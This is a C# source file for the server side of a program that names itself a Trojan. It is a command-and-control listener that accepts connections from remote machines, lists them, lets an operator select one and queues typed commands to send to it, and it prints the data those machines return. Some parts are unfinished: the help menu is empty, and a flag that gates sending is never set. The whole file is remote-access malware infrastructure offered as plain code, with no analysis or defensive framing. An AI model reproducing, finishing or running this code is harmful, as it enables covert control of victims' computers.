using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using SocketData;
using TrojanExceptions;

namespace Trojan
{
    public class Server : SocketHandler
    {
        public socketSetup Listener;
        public Socket? connectedToClient;

        protected string? CMD = null;

        public async Task Send_Socket()
        {
            if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));

            bool failedCMD;
            bool sendCMD;
            bool WaitResponse;
            while (Trojan.status == ServerStatus.RUNNING || Trojan.status == ServerStatus.OUTPUTTING)
            {
                if (Trojan.status == ServerStatus.OUTPUTTING)
                {
                    await Task.Delay(300);
                    continue;
                }

                failedCMD = false;
                sendCMD = false;
                WaitResponse = false;
                try
                {
                    await Task.Delay(300);
                    Console.Write("\r\nEnter command:\t");
                    CMD = Console.ReadLine();

                    if (CMD != null)
                    {
                        try
                        {
                            if (TruncationCheckCommand(CMD, 0, 5) == "local")
                            {
                                if (TruncationCheckCommand(CMD, 6, 3) == "cls" || TruncationCheckCommand(CMD, 6, 5) == "clear")
                                {
                                    Console.Clear();
                                }
                                else if (TruncationCheckCommand(CMD, 6, 4) == "exit")
                                {
                                    Environment.Exit(0);
                                }
                                else if (TruncationCheckCommand(CMD, 6, 4) == "help")
                                {
                                    // Display help menu
                                }
                            }
                            else if (TruncationCheckCommand(CMD, 0, 4) == "conn" || TruncationCheckCommand(CMD, 0, 7) == "connect")
                            {
                                string[] arguments = CMD.Substring(3).Split(" ");
                                if(connectedToClient != ConnectionManager.connections[int.Parse(arguments[1]) - 1].getConn())
                                {
                                    connectedToClient = ConnectionManager.connections[int.Parse(arguments[1]) - 1].getConn();
                                    Console.WriteLine("\n[+] Connected to :: {0} ;", connectedToClient.RemoteEndPoint);
                                }
                                else
                                {
                                    Console.WriteLine("\n[|] You are already connected to connection[" + int.Parse(arguments[1]) + "]");
                                }
                            }
                            else if (TruncationCheckCommand(CMD, 0, 2) == "do")
                            {
                                string[] arguments = CMD.Substring(1).Split(" ");
                                if(arguments[1] == "list")
                                {
                                    int IncrementalCounter = 0;
                                    int RangeCounter = -1;

                                    if (2 < arguments.Length) { int.TryParse(arguments[2], out RangeCounter); }
                                    foreach (ConnectionSetup connection in ConnectionManager.connections)
                                    {
                                        if (RangeCounter != 0) 
                                        {  
                                            IncrementalCounter++; 
                                        } else { break; }

                                        Console.WriteLine("\n\t\t" + connection.getRemoteEndPoint() + " [" + IncrementalCounter + "]");
                                        Console.WriteLine("\t\t" + new String('*', connection.getRemoteEndPoint().ToString().Length));

                                        if (IncrementalCounter == RangeCounter) break;
                                    }
                                }
                            }
                        } catch (Exception error) { Console.WriteLine(error);  failedCMD = true; }

                        if (connectedToClient != null && !failedCMD && sendCMD)
                        {
                            await connectedToClient.SendAsync(Encoding.UTF8.GetBytes(CMD), SocketFlags.None);
                            if(WaitResponse) 
                            { 
                                // do something when response is expected
                            }
                        }
                    } 
                }
                catch (Exception error)
                {
                    Console.WriteLine("\n\n[-] Send_Socket failed to send :: {0} :: {1} ;\n\n", nameof(error), error.ToString());
                }
            }
        }

        public async Task Receive_Socket()
        {
            ConnectionSetup CurrentConnection; 
            while (Trojan.status == ServerStatus.RUNNING)
            {
                await Task.Delay(EVENT_CHECK_INTERVAL);
                for (int i = 0; i < ConnectionManager.connections.Count(); i++)
                {
                    CurrentConnection = ConnectionManager.connections[i];
                    await CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None);

                    string message = Encoding.UTF8.GetString(CurrentConnection.getBuffer()).Replace("\0", "");
                    if (CurrentConnection.getBuffer().Length > 0 && message.Length > 0)
                    {
                        ConnectionManager.DataQueue.Enqueue(message);
                        Array.Clear(CurrentConnection.getBuffer(), 0, CurrentConnection.getBuffer().Length);
                    }
                    else
                    {
                        throw new ExceptionHandler("[-] ReceiveTask timed out : " + nameof(CurrentConnection));
                    }
                }

                ConnectionManager.OutputDataQueue();
            }
        }

        public void Init_Server(ushort port, uint buffSize)
        {
            Listener = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));

            if (Listener.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(Listener.sock));

            _SocketOperations.Bind_Socket(Listener);
            _SocketOperations.Listen_Socket(ref Listener.sock, MAX_CONNECTIONS);

            Console.WriteLine("[+] Started listening on port :: {0} ;", Listener.port);

            Task.Factory.StartNew(() => _SocketOperations.Accept_Socket(Listener));
            Task.Factory.StartNew(() => Receive_Socket());
            Task.Factory.StartNew(() => Send_Socket());
        }
    }
}